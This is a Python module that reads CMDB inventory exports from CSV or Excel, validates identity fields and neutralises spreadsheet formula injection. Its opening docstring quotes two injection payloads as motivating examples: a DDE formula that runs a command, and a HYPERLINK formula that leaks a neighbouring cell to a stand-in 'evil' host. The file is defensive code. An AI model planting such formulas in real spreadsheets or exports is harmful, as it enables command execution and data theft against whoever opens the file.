"""CMDB export reader: CSV or Excel in, normalized authoritative records out.

A CMDB export is a file a person edited. That single fact drives the whole design:

**Spreadsheets are programs, so cells are code.** A cell beginning `=`, `+`, `-`, `@` (or a
leading tab/carriage return, which Excel also treats as a formula lead-in) is executed when
the file is opened — `=cmd|'/c calc'!A1` is the classic, and `=HYPERLINK("http://evil/"&A1)`
quietly exfiltrates the column next to it. We never open these files in a spreadsheet, but
we *export* our data, and a value carried through unchanged would be a formula in whatever
report an operator opens next. So every value is defanged on the way in (ADR-0008), not on
the way out, because the way out is code nobody has written yet.

**Nothing else about the file can be trusted either.** Blank rows, a header that does not
match the mapping, a 4 MB cell, the same record id twice, an entry with no identifiable
device — each is refused with a reason and a row number, counted in the report, and never
silently dropped. A quiet loss here is the most dangerous failure this adapter has: a
managed device missing from `managed_record` reads as *shadow IT* in the P11 diff, which is
precisely the false accusation m2-design §1 warns burns trust in the whole product.

**Columns are configuration, not code.** Real exports call the serial `S/N`, `Serial`,
`Asset Tag`, or `Nombre de serie`. The operator supplies a `ColumnMapping`; a required
field with no mapping is a startup error, never a column quietly read as empty.

**Identity fields are validated, not just cleaned.** A MAC must look like a MAC, an IP must
parse, a hostname must look like a hostname. That is what makes the anchors P11 matches on
trustworthy — and it means a formula-shaped value in an identity column is rejected outright
rather than stored in defanged form.
"""

from __future__ import annotations

import csv
import re
from collections.abc import Iterable, Iterator, Mapping, Sequence
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Final
from uuid import UUID

from domain.errors import ValidationError
from domain.models import (
    ManagedRecordInput,
    ManagedSourceKind,
    SkippedRow,
    SkipReason,
    SourceReadReport,
)

#: The characters Excel and LibreOffice treat as the start of a formula. The whitespace
#: ones are the sneaky half: a leading tab or CR is stripped by the spreadsheet, so `\t=1+1`
#: is still a formula.
FORMULA_LEAD_CHARACTERS: Final = ("=", "+", "-", "@", "\t", "\r")

#: Prefixed to a formula-shaped value. Excel renders `'=x` as the literal text `=x` and does
#: not evaluate it; every other consumer sees an ordinary string. The value is preserved,
#: which matters — this is inventory data, not something to silently rewrite.
FORMULA_GUARD: Final = "'"

#: Past this, a cell is not a field, it is a payload. Real CMDB values are short.
MAX_CELL_LENGTH: Final = 500

#: A whole export we are willing to read in one go. A CMDB with more rows than this is a
#: conversation to have before importing, not something to discover at 3 AM.
MAX_ROWS: Final = 200_000

_HOSTNAME_RE: Final = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9._-]{0,252}[A-Za-z0-9])?$")
_MAC_RE: Final = re.compile(r"^[0-9a-f]{2}(?::[0-9a-f]{2}){5}$")
_SERIAL_RE: Final = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._/-]{0,63}$")
_IPV4_RE: Final = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}$")

#: The fields a row may carry. `external_id` is required — without it there is nothing to
#: make the import idempotent on.
IDENTITY_FIELDS: Final = ("hostname", "serial", "mac", "ip", "owner")


@dataclass(frozen=True, slots=True)
class ColumnMapping:
    """Which column of the operator's export feeds which field.

    `external_id` is mandatory. At least one identity field must be mapped, because a file
    with no serial, MAC, hostname or IP column produces records the diff can never match —
    an import that looks successful and is useless.

    `extras` maps any other columns worth keeping as free-text attributes (site, cost
    centre, lifecycle state). They are sanitised like everything else but are not validated
    as identifiers.
    """

    external_id: str
    hostname: str | None = None
    serial: str | None = None
    mac: str | None = None
    ip: str | None = None
    owner: str | None = None
    extras: Mapping[str, str] = field(default_factory=dict)

    def __post_init__(self) -> None:
        if not self.external_id.strip():
            raise ValidationError(
                "column mapping requires an 'external_id' column: without the CMDB's own "
                "record id there is nothing to make re-import idempotent on"
            )
        if not any(getattr(self, name) for name in ("hostname", "serial", "mac", "ip")):
            raise ValidationError(
                "column mapping requires at least one identity column (serial, mac, "
                "hostname or ip); records with none can never be matched to an asset"
            )

    def required_columns(self) -> tuple[str, ...]:
        """Columns that must exist in the file for this mapping to be honoured."""
        mapped = [self.external_id]
        mapped.extend(
            column
            for column in (self.hostname, self.serial, self.mac, self.ip, self.owner)
            if column
        )
        mapped.extend(self.extras.values())
        return tuple(mapped)


def defang(value: str) -> tuple[str, bool]:
    """Neutralise a spreadsheet formula. Returns the safe value and whether it was defanged.

    The value is kept and marked, not deleted: an inventory tool that silently rewrites the
    operator's data is its own kind of broken. `'` is the marker every spreadsheet already
    understands as "this is text".
    """
    if value.startswith(FORMULA_LEAD_CHARACTERS):
        return FORMULA_GUARD + value, True
    return value, False


def sanitize_cell(raw: object) -> tuple[str, bool]:
    """Clean one cell: printable characters only, bounded length, formula neutralised.

    Control characters go first — they are how a value smuggles a newline into a log line
    or a CSV row separator into an export.
    """
    if raw is None:
        return "", False
    text = raw if isinstance(raw, str) else str(raw)
    printable = "".join(char for char in text if char.isprintable() or char in " ")
    trimmed = printable.strip()[:MAX_CELL_LENGTH]
    return defang(trimmed)


def _identity(value: str, pattern: re.Pattern[str], *, lower: bool = False) -> str | None:
    """An identifier we are willing to match on, or nothing.

    Deliberately strict: a value that does not look like the thing it claims to be is worse
    than a missing one, because P11 will match on it. Note that a defanged value fails every
    one of these patterns — a formula in an identity column is refused, not stored.
    """
    candidate = value.lower() if lower else value
    return candidate if pattern.match(candidate) else None


def normalize_hostname(value: str) -> str | None:
    """Lower-cased, trailing dot removed. Case and a stray FQDN dot are the two ways the
    same host is written differently in a CMDB and on the wire."""
    return _identity(value.rstrip("."), _HOSTNAME_RE, lower=True)


def normalize_mac(value: str) -> str | None:
    """Canonical lower-case colon form — the same form the passive collector and the
    scanner produce, so the anchors actually compare equal."""
    candidate = value.strip().lower().replace("-", ":").replace(".", ":").replace(" ", "")
    parts = candidate.split(":")
    if len(parts) == 6 and all(0 < len(part) <= 2 for part in parts):
        candidate = ":".join(part.zfill(2) for part in parts)
    elif len(candidate) == 12:  # bare 12 hex digits, as some CMDBs store them
        candidate = ":".join(candidate[index : index + 2] for index in range(0, 12, 2))
    return candidate if _MAC_RE.match(candidate) else None


def normalize_serial(value: str) -> str | None:
    """Case-preserved: serials are case-sensitive on the label and in `dmidecode`."""
    return _identity(value.strip(), _SERIAL_RE)


def normalize_ip(value: str) -> str | None:
    """A dotted quad whose octets are in range. Kept as text: this is a locator the diff
    may look at, not something we connect to."""
    candidate = value.strip()
    if not _IPV4_RE.match(candidate):
        return None
    if any(int(octet) > 255 for octet in candidate.split(".")):
        return None
    return candidate


_NORMALIZERS: Final = {
    "hostname": normalize_hostname,
    "serial": normalize_serial,
    "mac": normalize_mac,
    "ip": normalize_ip,
}


class CsvCmdbSource:
    """`ManagedSource` over a CSV or Excel export.

    Constructed per import: the file, the operator's column mapping, and the moment the
    export was taken (`observed_at` — a CMDB row's truth is as of when someone exported it,
    not when we read the file).
    """

    def __init__(
        self,
        path: Path | str,
        mapping: ColumnMapping,
        *,
        observed_at: datetime,
        source: ManagedSourceKind = ManagedSourceKind.CMDB,
    ) -> None:
        self._path = Path(path)
        self._mapping = mapping
        self._source = source
        if observed_at.tzinfo is None or observed_at.tzinfo.utcoffset(observed_at) is None:
            raise ValidationError("observed_at must be timezone-aware (UTC)")
        self._observed_at = observed_at
        self._report = SourceReadReport(source_ref=self._path.name)

    def records(self, tenant_id: UUID) -> Iterable[ManagedRecordInput]:
        """Yield one normalized record per usable row. See the port contract."""
        self._report = SourceReadReport(source_ref=self._path.name)
        seen_ids: set[str] = set()

        for row_number, row in enumerate(self._rows(), start=2):  # row 1 is the header
            self._report.rows_read += 1
            record = self._to_record(tenant_id, row_number, row, seen_ids)
            if record is not None:
                self._report.records_yielded += 1
                yield record

    def read_report(self) -> SourceReadReport:
        """What the last read did. See the port contract."""
        return self._report

    # ------------------------------------------------------------------ reading

    def _rows(self) -> Iterator[Mapping[str, str]]:
        """Rows as `{column: sanitized value}`, from whichever format this file is."""
        if not self._path.is_file():
            raise ValidationError(f"CMDB export not found: {self._path}")

        suffix = self._path.suffix.lower()
        if suffix == ".csv":
            yield from self._csv_rows()
        elif suffix in {".xlsx", ".xlsm"}:
            yield from self._excel_rows()
        else:
            raise ValidationError(
                f"unsupported CMDB export format {suffix!r}; expected .csv or .xlsx"
            )

    def _csv_rows(self) -> Iterator[Mapping[str, str]]:
        with self._path.open(encoding="utf-8-sig", newline="") as handle:
            reader = csv.DictReader(handle)
            self._require_columns(reader.fieldnames)
            for index, raw_row in enumerate(reader):
                if index >= MAX_ROWS:
                    raise ValidationError(
                        f"CMDB export has more than {MAX_ROWS} rows; refusing to import it "
                        "in one pass"
                    )
                yield self._sanitize_row(raw_row)

    def _excel_rows(self) -> Iterator[Mapping[str, str]]:
        """Read a workbook defensively.

        `read_only` streams rather than materialising the sheet. `data_only=False` is the
        deliberate one: asking for cached values instead would hand back `None` for any
        formula the file was saved without a cached result for, and a field that silently
        becomes empty is the failure mode this adapter exists to not have (ADR-0008). Taking
        the cell's literal content instead means a `.xlsx` behaves exactly like the same
        export saved as `.csv` — formulas arrive as text, get defanged, and are *counted*.

        openpyxl parses the workbook's XML through `defusedxml` when it is installed, which
        it is (a dependency since P5), so the entity-expansion and XXE classes are handled
        by the same library the nmap adapter uses (ADR-0008).
        """
        from openpyxl import load_workbook

        workbook = load_workbook(self._path, read_only=True, data_only=False)
        try:
            sheet = workbook.worksheets[0]
            rows = sheet.iter_rows(values_only=True)
            header = next(rows, None)
            if header is None:
                raise ValidationError("CMDB export has no header row")

            columns = [str(cell).strip() if cell is not None else "" for cell in header]
            self._require_columns(columns)

            for index, values in enumerate(rows):
                if index >= MAX_ROWS:
                    raise ValidationError(
                        f"CMDB export has more than {MAX_ROWS} rows; refusing to import it "
                        "in one pass"
                    )
                yield self._sanitize_row(dict(zip(columns, values, strict=False)))
        finally:
            workbook.close()

    def _require_columns(self, columns: Sequence[str] | None) -> None:
        """A mapped column that is not in the file is a configuration error, loudly.

        The alternative — reading it as empty — produces an import that succeeds while
        losing exactly the field the operator cared about.
        """
        present = {column.strip() for column in (columns or []) if column}
        missing = [column for column in self._mapping.required_columns() if column not in present]
        if missing:
            raise ValidationError(
                f"CMDB export {self._path.name} is missing mapped columns {sorted(missing)}; "
                f"found {sorted(present)}"
            )

    def _sanitize_row(self, raw_row: Mapping[object, object]) -> Mapping[str, str]:
        """Clean every cell. The key is typed `object` because `csv.DictReader` really does
        hand back a `None` key for the overflow when a row has more fields than headers."""
        cleaned: dict[str, str] = {}
        for column, value in raw_row.items():
            if column is None:
                continue  # a row with more fields than headers; the extras are not mapped
            text, was_defanged = sanitize_cell(value)
            if was_defanged:
                self._report.defanged_cells += 1
            cleaned[str(column).strip()] = text
        return cleaned

    # ------------------------------------------------------------ normalization

    def _to_record(
        self,
        tenant_id: UUID,
        row_number: int,
        row: Mapping[str, str],
        seen_ids: set[str],
    ) -> ManagedRecordInput | None:
        """One row into one record, or a counted refusal."""
        if not any(row.values()):
            self._skip(row_number, SkipReason.BLANK)
            return None

        oversized = self._oversized_column(row)
        if oversized is not None:
            self._skip(row_number, SkipReason.OVERSIZED, column=oversized)
            return None

        external_id = row.get(self._mapping.external_id, "").strip()
        if not external_id:
            self._skip(row_number, SkipReason.NO_EXTERNAL_ID, column=self._mapping.external_id)
            return None
        if external_id in seen_ids:
            # Two rows claiming the same record id: the file disagrees with itself, and
            # picking one silently would be a guess about which is current.
            self._skip(row_number, SkipReason.DUPLICATE_EXTERNAL_ID)
            return None

        identity = self._identity_fields(row)
        if not any(identity[name] for name in ("serial", "mac", "hostname", "ip")):
            self._skip(row_number, SkipReason.NO_IDENTITY)
            return None

        seen_ids.add(external_id)
        return ManagedRecordInput(
            tenant_id=tenant_id,
            source=self._source,
            external_id=external_id,
            attributes={
                name: row[column]
                for name, column in self._mapping.extras.items()
                if row.get(column)
            },
            source_ref=self._path.name,
            observed_at=self._observed_at,
            **identity,
        )

    def _identity_fields(self, row: Mapping[str, str]) -> dict[str, str | None]:
        """Normalize each mapped identity column, dropping anything that does not validate.

        A value that fails its pattern becomes `None` rather than being stored as-is: an
        anchor the diff cannot trust is worse than no anchor, because P11 will match on it.
        """
        fields: dict[str, str | None] = {}
        for name in IDENTITY_FIELDS:
            column = getattr(self._mapping, name)
            value = row.get(column, "").strip() if column else ""
            if not value:
                fields[name] = None
                continue
            normalizer = _NORMALIZERS.get(name)
            fields[name] = normalizer(value) if normalizer else value
        return fields

    def _oversized_column(self, row: Mapping[str, str]) -> str | None:
        for column, value in row.items():
            if len(value) >= MAX_CELL_LENGTH:
                return column
        return None

    def _skip(self, row_number: int, reason: SkipReason, *, column: str | None = None) -> None:
        self._report.skipped.append(SkippedRow(row_number=row_number, reason=reason, column=column))
